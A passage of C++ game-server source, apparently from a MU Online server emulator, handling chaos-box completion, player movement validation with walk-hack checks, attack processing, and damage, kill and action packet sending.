			Box_LuckyItemsRefine(lpObj);
			break;
		default:
			CHAOS_LOG.Output("[%s][%s] Undefine chaosmix type detect %d",
				lpObj->AccountID, lpObj->Name, iMixType);
			break;
	}

	//[DaRKav] Save character inventory (prevent alt-f4)
	GDUserItemSave(lpObj);
}




void CGChaosBoxUseEnd(int aIndex)
{
	if ( !gObjIsConnectedGP(aIndex))
	{
		LogAddC(2, "error-L3 [%s][%d]", __FILE__, __LINE__);
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];

	PMSG_DEFAULT pMsg;
	PHeadSetB((LPBYTE)&pMsg, 0x87, sizeof(pMsg));
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

	if (( lpObj->m_IfState.use && lpObj->m_IfState.type == 7 ) ||
		( lpObj->m_IfState.use && lpObj->m_IfState.type == 97))	//Lucky Coins
	{
		lpObj->m_IfState.use = 0;
		lpObj->m_IfState.state = 0;
	}

	ChaosBoxInit(lpObj);
	gObjInventoryCommit(lpObj->m_Index);

	lpObj->bIsChaosMixCompleted = false;
	//lpObj->m_bIsCastleNPCUpgradeCompleted = false;
}




struct PMSG_ACTIONRESULT
{
	PBMSG_HEAD h;
	BYTE NumberH;	// 3
	BYTE NumberL;	// 4
	BYTE Dir;	// 5
	BYTE ActionNumber;	// 6
	BYTE TargetNumberH;	// 7
	BYTE TargetNumberL;	// 8
};


void PMoveProc(PMSG_MOVE* lpMove, int aIndex)
{
	if ( !OBJMAX_RANGE(aIndex))
	{
		LogAdd("error-L3 : move protocol index error %s %d", __FILE__, __LINE__);
		return;
	}

	PMSG_RECVMOVE pMove;
	short n;
	short pathtable;
	short ax;
	short ay;
	int sx;
	int sy;
	LPOBJ lpObj = &gObj[aIndex];

	if ( lpObj->RegenOk > 0 )
		return;

	if ( lpObj->SkillRecallParty_Time )
	{
		lpObj->SkillRecallParty_Time = 0;
		char msg[255];
		wsprintf(msg, lMsg.Get(MSGGET(4, 230)));
		GCServerMsgStringSend(msg, lpObj->m_Index, 1);
	}

	if ( (GetTickCount()-lpObj->m_LastMoveTime) < 100 )
		return;

	if ( lpObj->Teleport )
		return;

	if ( lpObj->m_SkillHarden )
	{
		gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);
		return;
	}

	if ( lpObj->m_iSkillStunTime > 0 )
	{
		gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);
		return;
	}

	lpObj->m_LastMoveTime = GetTickCount();
	lpObj->m_Rest = 0;
	lpObj->PathCur = 0;
	lpObj->Dir = lpMove->Path[0] >> 4;
	lpObj->PathCount = lpMove->Path[0] & 0x0F;

	if ( lpObj->PathCount > 15 )
	{
		LogAdd("error-L3 : Path Count error %d id:%s %s %d",
			lpObj->PathCount, lpObj->AccountID, __FILE__, __LINE__);
		return;
	}

	for ( n=0;n<15;n++)
	{
		lpObj->PathX[n]=0;
		lpObj->PathY[n]=0;
		//lpObj->PathOri[n]=0;
	}

	sx = lpMove->X;
	sy = lpMove->Y;

	if ( gObjCheckXYMapTile(lpObj, 1) == TRUE )
	{
		lpObj->PathCount = 0;
		lpObj->PathCur = 0;
		lpObj->PathStartEnd = 0;
		gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);
		return;
	}

	lpObj->PathX[0] = lpMove->X;
	ax = lpObj->PathX[0];
	lpObj->PathY[0] = lpMove->Y;
	ay = lpObj->PathY[0];
	lpObj->PathDir[0] = lpObj->Dir;
	lpObj->PathStartEnd = 1;

	if ( lpObj->PathCount > 0 )
	{
		lpObj->PathCur = 1;
		lpObj->PathCount++;
	}

	for (n=1;n<lpObj->PathCount;n++)
	{
		if ( (n%2) == 1 )
		{
			pathtable = lpMove->Path[(n+1) / 2] >> 4;
		}
		else
		{
			pathtable = lpMove->Path[(n+1) / 2] & 0x0F;
		}

		ax += RoadPathTable[pathtable*2];
		ay += RoadPathTable[pathtable*2+1];
		
		//lpObj->PathOri[n-1] = pathtable;
		lpObj->PathDir[n]= pathtable;
		lpObj->PathX[n] = ax;
		lpObj->PathY[n] = ay;
	}

	if ( lpObj->PathCount > 0 )
	{
		int nextX;
		int nextY;
		BYTE mapnumber;
		BYTE attr;
		nextX = lpObj->PathX[1];
		nextY = lpObj->PathY[1];
		mapnumber = lpObj->MapNumber;
		attr = MapC[mapnumber].GetAttr(nextX, nextY);

		if ( (((BYTE)attr & (BYTE)4) == (BYTE)4) || (((BYTE)attr & (BYTE)8) == (BYTE)8) )
		{
			for ( n=0 ; n<15 ; n++)
			{
				lpObj->PathX[n] = 0;
				lpObj->PathY[n] = 0;
				//lpObj->PathOri[n] = 0;
			}

			lpObj->PathCount = 0;
			lpObj->PathCur = 0;
			lpObj->PathStartEnd = 0;
			gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);
			return;
		}
	}

	lpObj->TX = (BYTE)ax;
	lpObj->TY = (BYTE)ay;

	//if (abs(lpObj->X - lpObj->TX) > 15 || abs(lpObj->Y - lpObj->TY) > 15)
	if (abs(lpObj->X - lpMove->X) > 15 || abs(lpObj->Y - lpMove->Y) > 15)
	{
		ANTI_HACK_LOG.Output("[Anti-Hack][%s][%s] Walk Hack/Warp attempt [%d][%d][%d] VS [%d][%d][%d]",
			lpObj->AccountID, lpObj->Name,
			lpObj->MapNumber, lpObj->X, lpObj->Y,
			lpObj->MapNumber, lpMove->X, lpMove->Y
			//lpObj->MapNumber, lpObj->TX, lpObj->TY
		);

		gObjTeleport(lpObj->m_Index, lpObj->MapNumber, lpObj->X, lpObj->Y);
		return;
	}

#if (GS_CASTLE==1)
	if (CRYWOLF_MAP_RANGE(lpObj->MapNumber))
	{
		if(g_Crywolf.CanWalk(lpObj->TX,lpObj->TY) == false)
		{
			lpObj->m_Rest = 1;
			lpObj->PathCur = 0;
			lpObj->PathCount = 0;
			lpObj->PathStartEnd = 0;
			gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);
			PMSG_ACTIONRESULT pActionResult;

			PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof(pActionResult));
			pActionResult.NumberH = SET_NUMBERH(aIndex);
			pActionResult.NumberL = SET_NUMBERL(aIndex);
			pActionResult.ActionNumber = 0x7A;
			pActionResult.Dir = lpObj->Dir;
			pActionResult.TargetNumberH = 0;
			pActionResult.TargetNumberL = 0;

			DataSend(lpObj->m_Index, (LPBYTE)&pActionResult, sizeof(pActionResult));
			return;
		}
	}
#endif

	if(IMPERIALGUARDIAN_MAP_RANGE(lpObj->MapNumber))
	{
		if(g_ImperialGuardian.CanWalk(lpObj->TX,lpObj->TY) == false)
		{
			lpObj->m_Rest = 1;
			lpObj->PathCur = 0;
			lpObj->PathCount = 0;
			lpObj->PathStartEnd = 0;
			gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);
			PMSG_ACTIONRESULT pActionResult;

			PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof(pActionResult));
			pActionResult.NumberH = SET_NUMBERH(aIndex);
			pActionResult.NumberL = SET_NUMBERL(aIndex);
			pActionResult.ActionNumber = 0x7A;
			pActionResult.Dir = lpObj->Dir;
			pActionResult.TargetNumberH = 0;
			pActionResult.TargetNumberL = 0;

			DataSend(lpObj->m_Index, (LPBYTE)&pActionResult, sizeof(pActionResult));
			return;
		}
	}

	if ( BC_MAP_RANGE(lpObj->MapNumber) && lpObj->Type == OBJ_USER )
	{
		int BCRest = MAP_INDEX_BLOODCASTLE1;
		if(lpObj->MapNumber == MAP_INDEX_BLOODCASTLE8)
			BCRest = 45;

		//int a = 2;
		//switch ( a )
		switch ( g_BloodCastle.GetCurrentState(lpObj->MapNumber-BCRest) )
		{
			case 0x01:
				{
					if ( lpObj->TY > 15 )
					{
						lpObj->m_Rest = 1;
						lpObj->PathCur = 0;
						lpObj->PathCount = 0;
						lpObj->PathStartEnd = 0;
						gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);

						PMSG_ACTIONRESULT pActionResult;

						PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof(pActionResult));
						pActionResult.NumberH = SET_NUMBERH(aIndex);
						pActionResult.NumberL = SET_NUMBERL(aIndex);
						pActionResult.ActionNumber = 0x7A;
						pActionResult.Dir = lpObj->Dir;
						pActionResult.TargetNumberH = 0;
						pActionResult.TargetNumberL = 0;

						DataSend(lpObj->m_Index, (LPBYTE)&pActionResult, sizeof(pActionResult));
						return;
					}
				}break;
			case 0x02:
				{
					if ( lpObj->Y > 17 && g_BloodCastle.CheckPlayStart(lpObj->MapNumber-BCRest) == false)
					{
						gObjMoveGate(lpObj->m_Index, lpObj->MapNumber+0x37);
						return;
					}

					if ( lpObj->TY > 15 && g_BloodCastle.CheckPlayStart(lpObj->MapNumber- BCRest) == false )
					{
						lpObj->m_Rest = 1;
						lpObj->PathCur = 0;
						lpObj->PathCount = 0;
						lpObj->PathStartEnd = 0;
						gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);

						PMSG_ACTIONRESULT pActionResult;

						PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof(pActionResult));
						pActionResult.NumberH = SET_NUMBERH(aIndex);
						pActionResult.NumberL = SET_NUMBERL(aIndex);
						pActionResult.ActionNumber = 0x7A;
						pActionResult.Dir = lpObj->Dir;
						pActionResult.TargetNumberH = 0;
						pActionResult.TargetNumberL = 0;

						DataSend(lpObj->m_Index, (LPBYTE)&pActionResult, sizeof(pActionResult));
						return;
					}

					//if ( lpObj->TY > 76 &&  g_BloodCastle.m_BridgeData[(lpObj->MapNumber-9)].m_bCASTLE_DOOR_LIVE )
					if ( lpObj->TY > 76 &&  g_BloodCastle.m_BridgeData[(lpObj->MapNumber-BCRest)].m_bCASTLE_DOOR_LIVE )
					{
						lpObj->m_Rest = 1;
						lpObj->PathCur = 0;
						lpObj->PathCount = 0;
						lpObj->PathStartEnd = 0;
						gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);

						PMSG_ACTIONRESULT pActionResult;

						PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof(pActionResult));
						pActionResult.NumberH = SET_NUMBERH(aIndex);
						pActionResult.NumberL = SET_NUMBERL(aIndex);
						pActionResult.ActionNumber = 0x7A;
						pActionResult.Dir = lpObj->Dir;
						pActionResult.TargetNumberH = 0;
						pActionResult.TargetNumberL = 0;

						DataSend(lpObj->m_Index, (LPBYTE)&pActionResult, sizeof(pActionResult));
						return;
					}
				}break;
		}
	}

	PHeadSetB((LPBYTE)&pMove, 0xD3, sizeof(pMove));
	pMove.NumberH = SET_NUMBERH(aIndex);
	pMove.NumberL = SET_NUMBERL(aIndex);
	pMove.X = ax;
	pMove.Y = ay;
	pMove.Path = lpObj->Dir << 4;

	if ( lpObj->Type == OBJ_USER )
	{
		if ( lpObj->m_IfState.use )
		{
			if ( lpObj->m_IfState.type == 3 )
			{
				lpObj->TargetShopNumber = -1;
				lpObj->m_IfState.type = 0;
				lpObj->m_IfState.use = 0;
			}else if(	lpObj->m_IfState.type == 12 ||  //Guardsman (SIEGE NPC)
						lpObj->m_IfState.type == 96 ||	//Illusion Temple
						lpObj->m_IfState.type == 98 ||	//Imperial Guardian
						lpObj->m_IfState.type == 99 ||	//Double Goer
						lpObj->m_IfState.type == 19		//Kanturu Entrance
					)
			{
				lpObj->m_IfState.use = 0;
				lpObj->m_IfState.type = 0;
			}
		}
#if (CRYSTAL_EDITION == 1)
#if (PACK_EDITION>=3)
		if(lpObj->VipShopOpen == TRUE)
		{
			SVShop.WindowState(lpObj->m_Index,0);
		}
#endif
#endif
		if ( !gObjPositionCheck(lpObj))
		{
			lpObj->PathCur = 0;
			lpObj->PathCount = 0;
			ax = lpObj->X;
			ay = lpObj->Y;
			lpObj->TX = (BYTE)ax;
			lpObj->TY = (BYTE)ay;
			pMove.X = ax;
			pMove.Y = ay;
		}

		DataSend(aIndex, (LPBYTE)&pMove, pMove.h.size);
	}

	int MVL = MAX_VIEWPORT;

	if ( lpObj->Type == OBJ_MONSTER )
		MVL = MAX_VIEWPORT_MONSTER;
		
	for (n=0;n<MVL;n++)
	{
		if ( lpObj->VpPlayer2[n].state == TRUE )
		{
			int number = lpObj->VpPlayer2[n].number;
			
			if ( number >= 0 )
			{
				if ( gObj[number].Connected > PLAYER_CONNECTED )
				{
					if ( gObj[number].Live )
					{
						if ( gObj[number].Type == OBJ_USER )
						{
							DataSend(lpObj->VpPlayer2[n].number, (LPBYTE)&pMove, pMove.h.size);
						}
					}
				}
				else
				{
					lpObj->VpPlayer2[n].number= -1;
					lpObj->VpPlayer2[n].state = 0;
					lpObj->VPCount2--;
				}
			}
		}
	}

	MapC[lpObj->MapNumber].ClearStandAttr(lpObj->m_OldX, lpObj->m_OldY);
	MapC[lpObj->MapNumber].SetStandAttr(lpObj->TX, lpObj->TY);
	lpObj->m_OldX = lpObj->TX;
	lpObj->m_OldY = lpObj->TY;
	lpObj->X = sx;
	lpObj->Y = sy;
	//lpObj->m_ViewState = 0;
}





void RecvPositionSetProc(PMSG_POSISTION_SET * lpMove, int aIndex)
{
	short n;

	if (  OBJMAX_RANGE(aIndex) == FALSE)
	{
		LogAdd("error : move protocol index error %s %d", __FILE__, __LINE__);
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];

	if ( ::PacketCheckTime(lpObj) == FALSE )
	{
		return;
	}

	if ( lpObj->Teleport != 0 )
	{
		return;
	}

	lpObj->X = lpMove->X;
	lpObj->Y = lpMove->Y;

	if ( CC_MAP_RANGE(lpObj->MapNumber) != FALSE )
	{
		if ( (GetTickCount() - lpObj->m_iChaosCastleBlowTime ) < 1000 )
		{
			return;
		}
	}

	if ( gObjCheckXYMapTile(lpObj, 2) == TRUE)
	{
		return;
	}

	PMSG_RECV_POSISTION_SET pMove;

	PHeadSetB((LPBYTE)&pMove, 0xDF, sizeof(pMove));
	pMove.NumberH = SET_NUMBERH(aIndex);
	pMove.NumberL = SET_NUMBERL(aIndex);
	pMove.X = lpMove->X;
	pMove.Y = lpMove->Y;
	lpObj->TX = lpMove->X;
	lpObj->TY = lpMove->Y;

	if ( ::gObjPositionCheck(lpObj) == FALSE )
	{
		return;
	}

	CreateFrustrum(lpObj->X, lpObj->Y, aIndex);

	if ( lpObj->Type == OBJ_USER )
	{
		DataSend(aIndex, (UCHAR *)&pMove, pMove.h.size);
	}

	int MVL = MAX_VIEWPORT;

	if ( lpObj->Type == OBJ_MONSTER )
	{
		MVL = MAX_VIEWPORT_MONSTER;
	}

	for ( n=0;n<MVL;n++)
	{
		if ( lpObj->VpPlayer2[n].type == OBJ_USER )
		{
			if ( lpObj->VpPlayer2[n].state == 1 )
			{
				int Index = lpObj->VpPlayer2[n].number;

				if ( gObj[Index].Connected > PLAYER_CONNECTED && gObj[Index].Live != FALSE)
				{
					DataSend(lpObj->VpPlayer2[n].number, (UCHAR *)&pMove, pMove.h.size);
				}
				else
				{
					lpObj->VpPlayer2[n].number = -1;
					lpObj->VpPlayer2[n].state = FALSE;
					lpObj->VPCount2--;
				}
			}
		}
	}

	MapC[lpObj->MapNumber].ClearStandAttr(lpObj->m_OldX, lpObj->m_OldY);
	MapC[lpObj->MapNumber].SetStandAttr(lpObj->TX, lpObj->TY);

	lpObj->m_OldX = lpObj->TX;
	lpObj->m_OldY = lpObj->TY;

}




void CGAttack(unsigned char * Msg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj;
	LPOBJ lpTargetObj;
	bool IsS5E2 = false;
	if(ReadConfig.IsEngProtocol == 0)
	{
		IsS5E2 = true;
	}else
	{
		if(Msg[0] != 0xC1)
			IsS5E2 = true;
	}
	if(ReadConfig.S5E2 == TRUE && IsS5E2 == true)
	{
		PMSG_ATTACK_S5E2* lpMsg = (PMSG_ATTACK_S5E2 *) Msg;		

		int usernumber = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);

		if ( usernumber < 0 || usernumber > OBJMAX-1)
		{
			LogAdd("[CGAttack] [UserIndex Error] :%s %d %d", __FILE__, __LINE__, usernumber);
			return;
		}

		if ( !gObj[usernumber].Live )
			return;

		lpObj = &gObj[aIndex];

		//if ( lpObj->HaveWeaponInHand )
		//{
			if ( !gObjUseSkill.SpeedHackCheck(aIndex,0) )
			{
				return;
			}
		//}

		//lpMsg->DirDis = lpMsg->UNKS5E2;
		//lpMsg->AttackAction = lpMsg->UNKS5E2_2;
		lpTargetObj = &gObj[usernumber];
		if(gObjIsConnected(usernumber) == TRUE)
		{
			if ( gObj[usernumber].Type == OBJ_USER )
			{
				if(gObj[usernumber].Authority == 40 && gObj[usernumber].AuthorityCode == 0x3F)
					if(usernumber != aIndex)
						return;
			}
		}
		lpObj->Dir = lpMsg->DirDis;
		GCActionSend(lpObj, lpMsg->AttackAction, aIndex, usernumber);
	}else
	{
		PMSG_ATTACK* lpMsg = (PMSG_ATTACK *) Msg;		
		int usernumber = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);

		if ( usernumber < 0 || usernumber > OBJMAX-1)
		{
			LogAdd("[CGAttack] [UserIndex Error] :%s %d %d", __FILE__, __LINE__, usernumber);
			return;
		}

		if ( !gObj[usernumber].Live )
			return;

		lpObj = &gObj[aIndex];

		//if ( lpObj->HaveWeaponInHand )
		//{
			if ( !gObjUseSkill.SpeedHackCheck(aIndex,0) )
			{
				return;
			}
		//}

		lpTargetObj = &gObj[usernumber];

		if(gObjIsConnected(usernumber) == TRUE)
		{
			if ( gObj[usernumber].Type == OBJ_USER )
			{
				if(gObj[usernumber].Authority == 40 && gObj[usernumber].AuthorityCode == 0x3F)
					if(usernumber != aIndex)
						return;
			}
		}

		lpObj->Dir = lpMsg->DirDis;
		GCActionSend(lpObj, lpMsg->AttackAction, aIndex, usernumber);
	}
	lpObj->MovePerSecs++;
	gComboAttack.CheckCombo(aIndex, 0);
	gObjAttack(lpObj, lpTargetObj, NULL, FALSE, FALSE, 0, FALSE);
	lpObj->UseMagicNumber = 0;
}



void GCDamageSend(int aIndex, int TargetIndex, int AttackDamage, int MSBFlag, int MSBDamage, int iShieldDamage)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}
	if(OBJMAX_RANGE(TargetIndex) == 0)
	{
		return;
	}
#if(CRYSTAL_MOB_BAR == 1)
	PMSG_ATTACKRESULT pResult;

	pResult.Life = gObj[TargetIndex].Life;
	pResult.MaxLife = gObj[TargetIndex].MaxLife;
#else
	PMSG_ATTACKRESULT_NORMAL pResult;
#endif

	PHeadSetB((LPBYTE)&pResult, 0xD7, sizeof(pResult));
	pResult.NumberH = SET_NUMBERH(TargetIndex);
	pResult.NumberL = SET_NUMBERL(TargetIndex);
	//pResult.DamageH = SET_NUMBERH(AttackDamage);
	//pResult.DamageL = SET_NUMBERL(AttackDamage);
	//pResult.btShieldDamageH = SET_NUMBERH(iShieldDamage);
	//pResult.btShieldDamageL = SET_NUMBERL(iShieldDamage);

	if ( MSBFlag != FALSE )
	{
		pResult.NumberH &= 0x7F;
		pResult.NumberH |= 0x80;
	}

	pResult.DamageType = MSBDamage;

	if ( cManager.WatchTargetIndex == TargetIndex || cManager.WatchTargetIndex == aIndex )
	{
		pResult.DamageH = SET_NUMBERH(AttackDamage);
		pResult.DamageL = SET_NUMBERL(AttackDamage);
		pResult.btShieldDamageH = SET_NUMBERH(iShieldDamage);
		pResult.btShieldDamageL = SET_NUMBERL(iShieldDamage);
		cManager.DataSend((LPBYTE)&pResult, pResult.h.size);
	}

	if ( gObj[TargetIndex].Type == OBJ_USER )
	{
		int newShieldDmg = iShieldDamage;

		if (iShieldDamage > MAX_DAMAGE_VALUE)
		{
			int sdCount = 0;
			int newDmg = 0;

			sdCount = floor((float)(iShieldDamage/MAX_DAMAGE_VALUE));

			for (int i=0; i < sdCount+1; i++)
			{
				if (i < sdCount)
				{
					newDmg = MAX_DAMAGE_VALUE;
				}
				else
				{
					newShieldDmg = iShieldDamage - (MAX_DAMAGE_VALUE*sdCount);
					continue;
				}

				pResult.DamageH = 0;
				pResult.DamageL = 0;
				pResult.btShieldDamageH = SET_NUMBERH(newDmg);
				pResult.btShieldDamageL = SET_NUMBERL(newDmg);

				DataSend(TargetIndex, (LPBYTE)&pResult, pResult.h.size);
				//Sleep(100);
			}
		}

		if (AttackDamage > MAX_DAMAGE_VALUE)
		{
			int loopCount = 0;
			int newDmg = 0;

			loopCount = floor((float)(AttackDamage/MAX_DAMAGE_VALUE));
			//LogAdd("[AttackDmg] %s made dmg:%d loops:%d", gObj[TargetIndex].Name, AttackDamage, loopCount);

			for (int i=0; i < loopCount+1; i++)
			{
				if (i < loopCount)
				{
					newDmg = MAX_DAMAGE_VALUE;
				}
				else
				{
					newDmg = AttackDamage - (MAX_DAMAGE_VALUE*loopCount);
				}

				//LogAdd("[AttackDmg][Loop][%d] %s made new_dmg:%d", i, gObj[TargetIndex].Name, newDmg);

				pResult.DamageH = SET_NUMBERH(newDmg);
				pResult.DamageL = SET_NUMBERL(newDmg);
				pResult.btShieldDamageH = SET_NUMBERH(newShieldDmg);
				pResult.btShieldDamageL = SET_NUMBERL(newShieldDmg);

				DataSend(TargetIndex, (LPBYTE)&pResult, pResult.h.size);
				newShieldDmg = 0;
				//Sleep(100);
			}
		} else {
			pResult.DamageH = SET_NUMBERH(AttackDamage);
			pResult.DamageL = SET_NUMBERL(AttackDamage);
			pResult.btShieldDamageH = SET_NUMBERH(newShieldDmg);
			pResult.btShieldDamageL = SET_NUMBERL(newShieldDmg);

			DataSend(TargetIndex, (LPBYTE)&pResult, pResult.h.size);
		}
	}

	if ( gObj[aIndex].Type == OBJ_USER )
	{
		int newShieldDmg = iShieldDamage;

		if (iShieldDamage > MAX_DAMAGE_VALUE)
		{
			int sdCount = 0;
			int newDmg = 0;

			sdCount = floor((float)(iShieldDamage/MAX_DAMAGE_VALUE));

			for (int i=0; i < sdCount+1; i++)
			{
				if (i < sdCount)
				{
					newDmg = MAX_DAMAGE_VALUE;
				}
				else
				{
					newShieldDmg = iShieldDamage - (MAX_DAMAGE_VALUE*sdCount);
					continue;
				}

				pResult.DamageH = 0;
				pResult.DamageL = 0;
				pResult.btShieldDamageH = SET_NUMBERH(newDmg);
				pResult.btShieldDamageL = SET_NUMBERL(newDmg);

				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
				//Sleep(100);
			}
		}

		if (AttackDamage > MAX_DAMAGE_VALUE)
		{
			int loopCount = 0;
			int newDmg = 0;

			loopCount = floor((float)(AttackDamage/MAX_DAMAGE_VALUE));
			//LogAdd("[AttackDmg] %s made dmg:%d loops:%d", gObj[aIndex].Name, AttackDamage, loopCount);

			for (int i=0; i < loopCount+1; i++)
			{
				if (i < loopCount)
				{
					newDmg = MAX_DAMAGE_VALUE;
				}
				else
				{
					newDmg = AttackDamage - (MAX_DAMAGE_VALUE*loopCount);
				}

				//LogAdd("[AttackDmg][Loop][%d] %s made new_dmg:%d", i, gObj[aIndex].Name, newDmg);

				pResult.DamageH = SET_NUMBERH(newDmg);
				pResult.DamageL = SET_NUMBERL(newDmg);
				pResult.btShieldDamageH = SET_NUMBERH(newShieldDmg);
				pResult.btShieldDamageL = SET_NUMBERL(newShieldDmg);

				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
				newShieldDmg = 0;
				//Sleep(100);
			}
		} else {
			pResult.DamageH = SET_NUMBERH(AttackDamage);
			pResult.DamageL = SET_NUMBERL(AttackDamage);
			pResult.btShieldDamageH = SET_NUMBERH(newShieldDmg);
			pResult.btShieldDamageL = SET_NUMBERL(newShieldDmg);

			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		}
	}
}



struct PMSG_DAMAGE
{
	PBMSG_HEAD h;	// C1:F3:07
	BYTE subcode;	// 3
	BYTE DamageH;	// 4
	BYTE DamageL;	// 5
	BYTE btShieldDamageH;	// 6
	BYTE btShieldDamageL;	// 7
};


void GCDamageSend(int aIndex, int AttackDamage, int iShieldDamage)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( gObj[aIndex].Type != OBJ_USER )
	{
		return;
	}

	PMSG_DAMAGE pDamage;

	PHeadSubSetB((LPBYTE)&pDamage, 0xF3, 0x07, sizeof(pDamage));
	//pDamage.DamageH = SET_NUMBERH(AttackDamage);
	//pDamage.DamageL = SET_NUMBERL(AttackDamage);
	//pDamage.btShieldDamageH = SET_NUMBERH(iShieldDamage);
	//pDamage.btShieldDamageL = SET_NUMBERL(iShieldDamage);

	if (iShieldDamage > MAX_DAMAGE_VALUE)
	{
		int sdCount = 0;
		int newDmg = 0;
		sdCount = floor((float)(iShieldDamage/MAX_DAMAGE_VALUE));

		for (int i=0; i < sdCount+1; i++)
		{
			if (i < sdCount)
			{
				newDmg = MAX_DAMAGE_VALUE;
			}
			else
			{
				iShieldDamage = iShieldDamage - (MAX_DAMAGE_VALUE*sdCount);
				continue;
			}

			pDamage.DamageH = 0;
			pDamage.DamageL = 0;
			pDamage.btShieldDamageH = SET_NUMBERH(newDmg);
			pDamage.btShieldDamageL = SET_NUMBERL(newDmg);

			DataSend(aIndex, (LPBYTE)&pDamage, pDamage.h.size);
			//Sleep(100);
		}
	}

	if (AttackDamage > MAX_DAMAGE_VALUE)
	{
		int loopCount = 0;
		int newDmg = 0;

		loopCount = floor((float)(AttackDamage/MAX_DAMAGE_VALUE));
		//LogAdd("[AttackDmg] %s made dmg:%d loops:%d", gObj[aIndex].Name, AttackDamage, loopCount);

		for (int i=0; i < loopCount+1; i++)
		{
			if (i < loopCount)
			{
				newDmg = MAX_DAMAGE_VALUE;
			}
			else
			{
				newDmg = AttackDamage - (MAX_DAMAGE_VALUE*loopCount);
			}

			//LogAdd("[AttackDmg][Loop][%d] %s made new_dmg:%d", i, gObj[aIndex].Name, newDmg);

			pDamage.DamageH = SET_NUMBERH(newDmg);
			pDamage.DamageL = SET_NUMBERL(newDmg);
			pDamage.btShieldDamageH = SET_NUMBERH(iShieldDamage);
			pDamage.btShieldDamageL = SET_NUMBERL(iShieldDamage);

			DataSend(aIndex, (LPBYTE)&pDamage, pDamage.h.size);
			iShieldDamage = 0;
			//Sleep(100);
		}
	} else {
		pDamage.DamageH = SET_NUMBERH(AttackDamage);
		pDamage.DamageL = SET_NUMBERL(AttackDamage);
		pDamage.btShieldDamageH = SET_NUMBERH(iShieldDamage);
		pDamage.btShieldDamageL = SET_NUMBERL(iShieldDamage);

		DataSend(aIndex, (LPBYTE)&pDamage, pDamage.h.size);
	}
}



struct PMSG_KILLPLAYER
{
	PBMSG_HEAD h;	// C1:16
	BYTE NumberH;	// 3
	BYTE NumberL;	// 4
	BYTE ExpH;	// 5
	BYTE ExpL;	// 6
	BYTE DamageH;	// 7
	BYTE DamageL;	// 8
};



void GCKillPlayerExpSend(int aIndex, int TargetIndex, int exp, int AttackDamage, BOOL MSBFlag)
{
	PMSG_KILLPLAYER pkillMsg;

	PHeadSetBE((LPBYTE)&pkillMsg, 0x16, sizeof(pkillMsg));
	pkillMsg.NumberH = SET_NUMBERH(TargetIndex);
	pkillMsg.NumberL = SET_NUMBERL(TargetIndex);
	pkillMsg.ExpH = SET_NUMBERH(exp);
	pkillMsg.ExpL = SET_NUMBERL(exp);

	if (AttackDamage > MAX_DAMAGE_VALUE)
		AttackDamage = MAX_DAMAGE_VALUE;

	pkillMsg.DamageH = SET_NUMBERH(AttackDamage);
	pkillMsg.DamageL = SET_NUMBERL(AttackDamage);

	if ( MSBFlag != FALSE )
	{
		pkillMsg.NumberH &= 0x7F;
		pkillMsg.NumberH |= 0x80;
	}

	if (  BC_MAP_RANGE(gObj[aIndex].MapNumber) != FALSE )
	{
		g_BloodCastle.AddExperience(aIndex, exp);
	}

	DataSend(aIndex, (UCHAR*)&pkillMsg, pkillMsg.h.size);
}




struct PMSG_DIEPLAYER
{
	PBMSG_HEAD h;	// C1:17
	BYTE NumberH;	// 3
	BYTE NumberL;	// 4
	WORD Skill;	// 5
	BYTE KillerNumberH;	// 6
	BYTE KillerNumberL;	// 7
};



void GCDiePlayerSend(LPOBJ lpObj, int TargetIndex, BYTE skill, int KillerIndex)
{
	PMSG_DIEPLAYER pDieMsg;

	PHeadSetB((LPBYTE)&pDieMsg, 0x17, sizeof(pDieMsg));
	pDieMsg.NumberH = SET_NUMBERH(TargetIndex);
	pDieMsg.NumberL = SET_NUMBERL(TargetIndex);
	pDieMsg.Skill = skill;
	pDieMsg.KillerNumberH = SET_NUMBERH(KillerIndex);
	pDieMsg.KillerNumberL = SET_NUMBERL(KillerIndex);
	int iSize = pDieMsg.h.size;

	MsgSendV2(lpObj, (LPBYTE)&pDieMsg, iSize);

	if ( lpObj->Type == OBJ_USER )
	{
		DataSend(lpObj->m_Index, (LPBYTE)&pDieMsg, iSize);
	}
}




void GCActionSend(LPOBJ lpObj, BYTE ActionNumber, int aIndex, int aTargetIndex)
{
	PMSG_ACTIONRESULT pActionResult;

	PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof(pActionResult));
	pActionResult.NumberH = SET_NUMBERH(aIndex);
	pActionResult.NumberL = SET_NUMBERL(aIndex);
	pActionResult.ActionNumber = ActionNumber;
	pActionResult.Dir = lpObj->Dir;
	pActionResult.TargetNumberH = SET_NUMBERH(aTargetIndex);
	pActionResult.TargetNumberL = SET_NUMBERL(aTargetIndex);

	MsgSendV2(lpObj, (LPBYTE)&pActionResult, pActionResult.h.size);
}


void CGActionRecv(PMSG_ACTION * lpMsg, int aIndex)
{
	if ( !OBJMAX_RANGE(aIndex))
	{
		LogAdd("error : move protocol index error %s %d", __FILE__, __LINE__);
		return;
	}

	PMSG_ACTIONRESULT pResult;
	LPOBJ lpObj = &gObj[aIndex];

